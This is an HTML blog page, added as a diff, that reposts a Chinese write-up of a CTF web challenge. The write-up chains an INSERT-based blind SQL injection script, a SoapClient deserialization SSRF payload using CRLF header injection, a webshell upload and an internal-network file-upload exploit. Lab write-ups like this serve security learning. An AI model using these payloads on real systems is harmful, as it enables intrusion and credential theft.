@@ -1,0 +1,481 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>De1ctfshellshellshell记录 | 开发者问答集锦</title>
+    <meta property="og:title" content="De1ctfshellshellshell记录 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="De1ctfshellshellshell记录">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/de1ctfshellshellshell%E8%AE%B0%E5%BD%95/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">De1ctfshellshellshell记录</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            <p>虽然是N1CTF原题，但是自己没遇见过，还是做的题少，记录一下吧==</p>
+
+<p>1.源码泄露，直接可以下到所有源码，然后代码审计到一处insert型注入：<br />
+<a href="https://img.it610.com/image/info8/19d5460fd7b942cca7bfffabd50c3084.jpg"><img src="https://img.it610.com/image/info8/19d5460fd7b942cca7bfffabd50c3084.jpg" alt="De1ctf - shell shell
+shell记录_第1张图片" /></a></p>
+
+<p>这里直接带入insert里面，跟进去看看</p>
+
+<p><a href="https://img.it610.com/image/info8/1e125cf70ad14d2e8e7b5888ff5aeb4c.jpg"><img src="https://img.it610.com/image/info8/1e125cf70ad14d2e8e7b5888ff5aeb4c.jpg" alt="De1ctf - shell shell
+shell记录_第2张图片" /></a></p>
+
+<p>insert函数对values进行正则替换，先调用get_columnsp</p>
+
+<p><a href="https://img.it610.com/image/info8/eaeb7b7d14cf4b58bfc3335aeeba6fef.jpg"><img src="https://img.it610.com/image/info8/eaeb7b7d14cf4b58bfc3335aeeba6fef.jpg" alt="De1ctf - shell shell
+shell记录_第3张图片" /></a></p>
+
+<p>这里把数组分成以<code>,
+</code>连接的字符串并且以`反引号包在内，而正则则是匹配字符串中所有反引号之间的内容，将其取出放到两个单引号里面，要是一下子看不出来其实可以把这一两个函数挑出来单独测试一下：</p>
+
+<pre><code>php
+function get_column($columns){
+
+        if(is_array($columns))
+            $column = ' `'.implode('`,`',$columns).'` ';
+        else
+            $column = ' `'.$columns.'` ';
+
+        return $column;
+    }
+$a=['a','b'];
+$value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',get_column($a)).')';
+echo  $value;
+</code></pre>
+
+<p>如果我们按常规的insert注入a&rsquo; or sleep(5),3)#那么此时values最终为：</p>
+
+<p><a href="https://img.it610.com/image/info8/8dd8e566bf604511a5519c634dccab39.jpg"><img src="https://img.it610.com/image/info8/8dd8e566bf604511a5519c634dccab39.jpg" alt="" /></a></p>
+
+<p>可以看到此时values形式明显出现了错误，因为此时我们注入了一个逗号，那么正则中<code>([^</code>,])<code>意思是匹配两个反引号之间除了反引号和逗号之外的所有字符，要是没有逗号，此时正好闭合前面的‘
+但单引号，所以在注入逗号的同时我们还要让</code>反引号变为单引号来闭合，我们可以注入反引号，从而<code>b</code>
+,替换后就为&rsquo;b&rsquo;，此时就能闭合，并且可以使用单引号，那么后面延时注入就ok了。</p>
+
+<p><a href="https://img.it610.com/image/info8/abffe04e238c4200a3da21752a6d6cc6.jpg"><img src="https://img.it610.com/image/info8/abffe04e238c4200a3da21752a6d6cc6.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/3204efa0391a414f8e89425b53eb6715.jpg"><img src="https://img.it610.com/image/info8/3204efa0391a414f8e89425b53eb6715.jpg" alt="" /></a></p>
+
+<p>可以通过burp直接看到延时效果，那么后面脚本直接上就行，比赛的时候用的国外服务器，我的网速太卡，延时没跑出来，就算语句正确也有好几秒的延时，体验很差劲==</p>
+
+<p><a href="https://img.it610.com/image/info8/38da0c7461f54018bfb890aa902625d1.png"><img src="https://img.it610.com/image/info8/38da0c7461f54018bfb890aa902625d1.png" alt="De1ctf - shell shell
+shell记录_第4张图片" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/ef061b79e508451b9614bcf3ec7e34dd.jpg"><img src="https://img.it610.com/image/info8/ef061b79e508451b9614bcf3ec7e34dd.jpg" alt="De1ctf - shell shell
+shell记录_第5张图片" /></a></p>
+
+<p>然后直接脚本跑就行：</p>
+
+<pre><code>#coding:utf-8
+import  string
+import binascii
+import requests
+import re
+payloads = &quot;0123456789abcdef&quot;
+url = &quot;http://web69.buuoj.cn/index.php?action=publish&quot;
+cookie={&quot;PHPSESSID&quot;:&quot;dru7esue1432fnpta7behviqc1&quot;}
+
+inject = requests.session()
+password=&quot;&quot;
+def dump_flag():
+    password=&quot;&quot;
+    for i in range(1,33):
+        for payload in payloads:
+            ch = ord(payload)
+            data = {
+                &quot;signature&quot;: &quot;111`,3),(if(ascii(substring((select password from ctf_users where username=0x61646d696e),&quot;+str(i)+&quot;,1))=&quot;+str(ch)+&quot;,sleep(5),0),3,4,5)#&quot;,
+                &quot;mood&quot;: 0
+            }
+            try:
+                a = inject.post(url=url,data=data,cookies=cookie,timeout=2)
+                #print(data)
+            except:
+                password = password +  payload
+                print(password)
+                break
+
+dump_flag()
+</code></pre>
+
+<p>buu平台有waf所以一跑就有验证码，跑出来密码还是 <strong>jaivypassword</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/799d142c24ca4e1699a52e386a8bbd16.jpg"><img src="https://img.it610.com/image/info8/799d142c24ca4e1699a52e386a8bbd16.jpg" alt="" /></a></p>
+
+<p>但是此时显示无法登录，ip地址有限制，回去看看源码：</p>
+
+<p>这里是获得remote_addr来进行判断，所以必须找到一处ssrf来</p>
+
+<p><a href="https://img.it610.com/image/info8/6c86ac50138f46a08046041546b7d0ed.jpg"><img src="https://img.it610.com/image/info8/6c86ac50138f46a08046041546b7d0ed.jpg" alt="De1ctf - shell shell
+shell记录_第6张图片" /></a></p>
+
+<p>从而完成登录，这里注意到其实还有一处反序列化漏洞：</p>
+
+<p><a href="https://img.it610.com/image/info8/2de851db07b8434ea9a2b9a4b5d9dbd3.jpg"><img src="https://img.it610.com/image/info8/2de851db07b8434ea9a2b9a4b5d9dbd3.jpg" alt="De1ctf - shell shell
+shell记录_第7张图片" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/32606b282d1244ef9a7229a8da74b220.jpg"><img src="https://img.it610.com/image/info8/32606b282d1244ef9a7229a8da74b220.jpg" alt="De1ctf - shell shell
+shell记录_第8张图片" /></a></p>
+
+<p>虽然将mood参数转int并addshalshes了，但是后面mood参数在可以注入的signnature参数后面，所以可以通过注入将其直接注释掉，来注入一个我们的恶意序列化对象，这里因为要ssrf，并且源代码里面没有可以直接进行ssrf的类，因此选择soapclinet类来进行ssrf，因为是内置类，所以用起来也方便，那么soapclient发送网络请求的一个条件就是，必须调用不存在的方法，从而触发其__call方法来发送网络请求，比如这里</p>
+
+<p><a href="https://img.it610.com/image/info8/7e43340a65a34907bef8181d74846b59.jpg"><img src="https://img.it610.com/image/info8/7e43340a65a34907bef8181d74846b59.jpg" alt="" /></a></p>
+
+<p>明显符合触发条件，所以直接构造即可：</p>
+
+<p>原始exp，这个是一般测试，可以在其中直接根据我们的情况进行修改，这里要关注源码：</p>
+
+<pre><code>php
+$target = 'http://127.0.0.1/test.php';
+$post_string = '1=file_put_contents(&quot;shell.php&quot;, &quot;&quot;);';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: xxxx=1234'
+    );
+$b = new SoapClient(null,array('location' =&gt; $target,
+'user_agent'=&gt;'wupco^^Content-Type:application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length:'.(string)strlen($post_string).'^^^^'.$post_string,
+'uri'=&gt; &quot;aaab&quot;));
+//因为user-agent是可以控制的，因此可以利用crlf注入http头来发送post请求
+$aaa = serialize($b);
+$aaa = str_replace('^^','%0d%0a',$aaa);
+$aaa = str_replace('&amp;','%26',$aaa);
+
+$c=unserialize(urldecode($aaa));
+$c-&gt;ss();  //调用_call方法触发网络请求发送
+?&gt;
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/05eae905c3ad48de922e9ef110612a3c.jpg"><img src="https://img.it610.com/image/info8/05eae905c3ad48de922e9ef110612a3c.jpg" alt="De1ctf - shell shell
+shell记录_第9张图片" /></a></p>
+
+<p>因为要请求的login功能，所以我们要post
+admin的username和password以及验证码，同时要加上自己的cookie，用于在ssrf以后用此cookie登录admin</p>
+
+<pre><code>php
+$target = 'http://web69.buuoj.cn/index.php?action=login';
+$post_string = 'username=admiin&amp;password=jaivypassword&amp;code=(自己的验证码)';
+$headers = array(
+    'Cookie: PHPSESSID=1234' #(未登录的cookie，便于以admin身份进行登陆)
+    );
+$b = new SoapClient(null,array('location' =&gt; $target,
+'user_agent'=&gt;'wupco^^Content-Type:application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length:'.(string)strlen($post_string).'^^^^'.$post_string,
+'uri'=&gt; &quot;aaab&quot;));
+//因为user-agent是可以控制的，因此可以利用crlf注入http头来发送post请求
+$aaa = serialize($b);
+$aaa = str_replace('^^','%0d%0a',$aaa);
+$aaa = str_replace('&amp;','%26',$aaa);
+
+echo $aaa;
+?&gt;
+</code></pre>
+
+<p>登陆以后就上传shell，shell传到了/app/upload/</p>
+
+<p><a href="https://img.it610.com/image/info8/76803acaf8f443b29865df2ef1b572e4.jpg"><img src="https://img.it610.com/image/info8/76803acaf8f443b29865df2ef1b572e4.jpg" alt="De1ctf - shell shell
+shell记录_第10张图片" /></a></p>
+
+<p>这里我还傻逼了，一位/app是个绝对路径，实际上app就是当前网站路径，==，我擦，那么直接访问upload就能访问到shell。</p>
+
+<p>之后内网还有一个.2的ip，也是一道原题，对其可以直接ew正向代理进去，然后在/etc/下就能找到flag，最快的当然是执行find /etc/ -name
+&ldquo;<em>flag</em>&rdquo;,我看师傅们都上shell然后用蚁剑，还挺方便直接扫内网存活端口，还支持curl，唉 win
+真辣鸡，过几天在虚拟机也要学学它，内网的题目绕过方法在我另一篇文件操作里面已经说过了，就不说了，原题链接wp：<a href="https://blog.cindemor.com/post/ctf-">https://blog.cindemor.com/post/ctf-</a>
+web-12.html</p>
+
+<p>放个exp:</p>
+
+<pre><code>import requests
+url = &quot;http://172.16.54.2/index.php&quot;
+files=[('file',('shell.php',&quot;@&quot;))]
+data={&quot;file[1]&quot;:&quot;2333&quot;,&quot;file[0]&quot;:&quot;xxx/../tr1ple_v1.php&quot;,&quot;hello&quot;:&quot;tr1ple_v1.php&quot;}
+r = requests.post(url=url, data=data,files=files)
+print(r.content)
+</code></pre>
+
+<p>这里glizjin师傅的php exp也可以，直接用curl来发post包</p>
+
+<pre><code>php
+
+$curl = curl_init();
+
+curl_setopt_array($curl, array(
+  CURLOPT_URL =&gt; &quot;http://172.16.54.2&quot;,
+  CURLOPT_RETURNTRANSFER =&gt; true,
+  CURLOPT_ENCODING =&gt; &quot;&quot;,
+  CURLOPT_MAXREDIRS =&gt; 10,
+  CURLOPT_TIMEOUT =&gt; 30,
+  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST =&gt; &quot;POST&quot;,
+  CURLOPT_POSTFIELDS =&gt; &quot;------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;tr1ple.php\&quot;\r\nContent-Type: false\r\n\r\n@
+  CURLOPT_HTTPHEADER =&gt; array(
+    &quot;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22&quot;,
+    &quot;cache-control: no-cache&quot;,
+    &quot;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;
+  ),
+));
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+curl_close($curl);
+
+if ($err) {
+  echo &quot;cURL Error #:&quot; . $err;
+} else {
+  echo $response;
+}
+</code></pre>
+
+<p>总结：</p>
+
+<p><strong>一眼看不出来函数的处理结果及函数的功能就把它单独提出来测试来bypass</strong></p>
+
+<p>转载于:<a href="https://www.cnblogs.com/wfzWebSecuity/p/11312569.html">https://www.cnblogs.com/wfzWebSecuity/p/11312569.html</a></p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
